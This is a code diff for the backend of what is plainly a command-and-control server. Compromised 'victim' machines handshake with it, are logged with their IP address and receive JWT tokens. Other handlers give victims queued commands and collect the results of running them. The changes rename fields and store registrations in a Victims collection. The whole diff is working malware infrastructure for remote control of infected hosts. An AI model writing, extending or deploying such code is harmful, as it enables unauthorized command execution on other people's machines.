@@ -4,18 +4,21 @@ const sanitize = require("mongo-sanitize");
 const authMiddleware = require("../middleware/authMiddleware");
 
 async function initialHandshake(req, res) {
-	const ipv4 = req.ip;
-	const currentDate = helper.getCurrentDate();
-	const victimHostname = sanitize(req.body["hostname"]);
-	const victimDescription = sanitize(req.body["description"]);
 
-	if (!victimHostname) {
+	console.log('Hit !');
+
+	const ipv4 = req.ip;
+	const currentDate = new Date();
+	const victimName = sanitize(req.body["victimName"]);
+	const victimAdditionalinfo = sanitize(req.body["victimAdditionalinfo"]);
+
+	if (!victimName) {
 		return res.send({ status: false, message: "Broken request" });
 	} else {
-		const record = new mongodb.Admins({
+		const record = new mongodb.Victims({
 			ipv4: ipv4,
-			victimHostname: victimHostname,
-			victimDescription: victimDescription,
+			victimName: victimName,
+			victimAdditionalinfo: victimAdditionalinfo,
 			handshakeDate: currentDate,
 			heartBeatInterval: 60, // in seconds
 		});
@@ -24,15 +27,15 @@ async function initialHandshake(req, res) {
 			.save()
 			.then(async () => {
 				console.log("New victim joined !");
-				const refreshToken = await authMiddleware.generateRefreshToken(
+				const RefreshToken = await authMiddleware.generateRefreshToken(
 					record._id,
 					"victim",
 				);
-				const jwtToken = authMiddleware.generateJwtToken(record._id, "victim");
+				const JwtToken = authMiddleware.generateJwtToken(record._id, "victim");
 
 				return res
 					.status(200)
-					.send({ status: true, jwtToken, refreshToken, username: record._id });
+					.send({ status: true, JwtToken, RefreshToken, Username: record._id });
 			})
 			.catch((err) => {
 				console.log(err);
@@ -44,7 +47,7 @@ async function initialHandshake(req, res) {
 }
 
 async function getCmd(req, res) {
-	const username = req.decoded['username'];
+	const username = req.decoded["username"];
 
 	const filterVictim = { victimId: username }; // desired filter criteria
 
@@ -69,7 +72,7 @@ async function getCmd(req, res) {
 }
 
 async function postResult(req, res) {
-	const username = req.decoded['username'];
+	const username = req.decoded["username"];
 
 	const { result, commandId } = req.body;
 
